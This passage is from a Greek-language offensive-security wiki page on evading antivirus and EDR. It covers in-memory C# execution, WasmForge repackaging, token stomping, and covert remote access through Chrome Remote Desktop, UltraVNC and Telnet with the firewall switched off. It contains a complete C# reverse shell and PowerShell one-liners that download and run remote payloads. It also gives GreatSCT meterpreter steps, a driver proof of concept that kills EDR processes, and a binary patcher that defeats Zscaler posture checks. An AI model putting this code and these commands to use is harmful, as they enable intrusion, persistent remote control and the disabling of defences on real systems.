Τα περισσότερα frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) προσφέρουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει τη **δημιουργία μιας νέας αναλώσιμης διεργασίας**, την εισαγωγή του κακόβουλου κώδικα post-exploitation σε αυτήν τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Η μέθοδος αυτή έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι αν κάτι πάει στραβά κατά τη δράση post-exploitation ή εντοπιστεί, υπάρχουν **πολύ περισσότερες πιθανότητες** να **επιβιώσει το implant**. Το μειονέκτημα είναι ότι υπάρχουν **περισσότερες πιθανότητες** να εντοπιστείτε από τις **Συμπεριφορικές ανιχνεύσεις**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την εισαγωγή του κακόβουλου κώδικα post-exploitation **στη δική του διεργασία**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά κατά την εκτέλεση του payload, υπάρχουν **πολύ περισσότερες πιθανότητες** να **χάσετε το beacon**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και [το βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly repackaging of .NET tools (WasmForge)

Οι συνήθεις τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει αντί γι' αυτό το περιβάλλον εκτέλεσης: μεταφέρει ένα έργο C# στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν host Windows PE που βασίζεται στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του στόχου, οπότε οι κανόνες που βασίζονται αποκλειστικά σε ονόματα managed assemblies, στη φόρτωση CLR, στο AMSI ή στο .NET ETW χάνουν την άμεση ορατότητα. Πρόκειται για τεχνική αποφυγής εντοπισμού/συσκευασίας και όχι για παράκαμψη ορίου προνομίων — ο guest διατηρεί τα αρχικά δικαιώματα και την παρατηρήσιμη συμπεριφορά του εργαλείου στο λειτουργικό σύστημα.<sup>[[44]](#references)[[45]](#references)</sup>

### Building a C# project

Η προτεινόμενη διαδικασία build χρησιμοποιεί το περιβάλλον Docker του έργου, καθώς περιλαμβάνει το .NET 10 SDK, το workload NativeAOT-LLVM, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· η διαδικασία build με μία εντολή εκτελεί τη μεταφορά, την επιδιόρθωση συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία του PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για την αντιμετώπιση προβλημάτων ή την επιθεώρηση του παραγόμενου κώδικα, χωρίστε τη διαδικασία σε `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Η εικόνα build χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το ενσωματωμένο runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γεφύρωση wasm32 C# με x64 Win32

Δεν πρόκειται για διαφανή επαναμεταγλώττιση. Το NativeAOT-WASI δεν υποστηρίζει ή τροποποιεί λειτουργίες του BCL που σχετίζονται με Windows, ενώ ένας wasm32 guest συνήθως δεσμεύει θέσεις δεικτών τεσσάρων byte, ενώ τα x64 API μπορούν να επιστρέψουν δείκτες οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα εξής παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένας source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε helpers `Wf*`.
2. Ένας σαρωτής P/Invoke παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με linked C bridge symbols αντί να φορτώνουν δυναμικά το δηλωμένο DLL μέσα στον guest.
3. Οι δείκτες που προορίζονται για τον host χρησιμοποιούν `ulong` στη C# και `uint64_t` στη C. Ένας γενικός dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σχήματος wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην καταστρέψει τα γειτονικά τέσσερα byte.
4. Ειδικά host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη γενική dispatch κλήσεων συστήματος, όπως πρόσβαση στην cache ticket της LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, κίνηση TCP KDC και ερωτήματα LDAP.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και ορίζει τα bits 2 και 3 (`0xC`), επειδή ο δείκτης value και το length είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει γενικό και αναθέτει το όνομα DLL, το όνομα export, τα arguments και τη μάσκα στο `wf_call_v2`· ο host εκτελεί τη μετάφραση δεικτών και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία μετατόπισης της ανίχνευσης

Ο κώδικας με εκτεταμένη χρήση reflection, η δυναμική φόρτωση assembly, τα αυθαίρετα native callbacks και οι σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM ενδέχεται να εξακολουθούν να απαιτούν patches ειδικά για κάθε εργαλείο ή να αποτυγχάνουν εντελώς. Τα γενικά sockets του WASI Preview 2 ενδέχεται επίσης να καταλήγουν σε no-op stubs, γι’ αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύετε κάθε εντολή σε native build αντί να υποθέτετε ότι υπάρχει ισοδυναμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει την τηλεμετρία αντί να καθιστά το payload αόρατο. Η ανίχνευση μπορεί να εστιάσει σε ένα PE που περιέχει ή υλοποιεί ένα WASM module, στη συμπεριφορά runtime τύπου Wazero, σε ασυνήθιστη κατανομή και αντιγραφή μνήμης host/guest, σε γενική απευθείας κλήση Win32, σε ανωμαλίες υπογραφής και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που προκύπτουν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται ένδειξη ότι μια διεργασία είναι αβλαβής.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα σε άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώνει τα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη στατικών signatures**. Οι δοκιμές με τυχαία, μη obfuscated scripts reverse shell σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Επαναφιλοξενία WebAssembly για αποφυγή στατικής ανάλυσης

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των προνομίων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, εμποδίζοντάς την ταυτόχρονα να εκτελεί ενέργειες προνομιακής επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν, τα Windows θα μπορούσαν να **εμποδίσουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτήν την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και έπειτα να το χρησιμοποιήσετε για να αναλάβετε τον έλεγχό του και να διατηρήσετε την persistence:<sup>[[35]](#references)</sup>
1. Κάντε λήψη από το https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και έπειτα στο αρχείο MSI για Windows, για να το κατεβάσετε.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες τροποποιήσεις: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση GUI).
 

## Προηγμένη αποφυγή ανίχνευσης

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή ανίχνευσης είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα επιτεθείτε έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτρέπω να παρακολουθήσετε αυτήν την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα για πιο προηγμένες τεχνικές αποφυγής ανίχνευσης.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) για την πολυεπίπεδη αποφυγή ανίχνευσης.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και θα σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει ανοιχτή web υπηρεσία στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν ξεκινά το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλάξτε τη θύρα telnet** (stealth) και απενεργοποιήστε το firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις λήψεις bin, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Εκκινήστε το daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# reverse shell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα με C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της Python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξόντωση AV/EDR από τον χώρο του πυρήνα

Η Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες endpoint πριν εγκαταστήσει ransomware. Το εργαλείο φέρνει το **δικό του ευάλωτο αλλά *υπογεγραμμένο* πρόγραμμα οδήγησης** και το εκμεταλλεύεται για να εκτελεί προνομιούχες λειτουργίες πυρήνα, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένο πρόγραμμα οδήγησης**: Το αρχείο που εγγράφεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το δυαδικό αρχείο είναι το νόμιμα υπογεγραμμένο πρόγραμμα οδήγησης `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή το πρόγραμμα οδήγησης φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένη η επιβολή υπογραφής προγραμμάτων οδήγησης (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το userland.
3. **IOCTLs που εκθέτει το driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Εκφόρτωση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες σε user mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες λειτουργίες ενίσχυσης της ασφάλειας.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ειδοποιείτε όταν φορτώνεται πρόγραμμα οδήγησης από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user mode προς προσαρμοσμένα device objects και έπειτα ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων Posture του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες posture συσκευής και βασίζεται σε Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες επιλογές σχεδιασμού επιτρέπουν την πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου στην πλευρά του client** (στον server αποστέλλεται μια boolean τιμή).
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται συμμορφωμένος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Αφαιρείται με NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμη και μη υπογεγραμμένη) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακάμπτονται |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι συμμόρφωσης εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζουν οι πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και απλοί έλεγχοι υπογραφής με μερικές τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

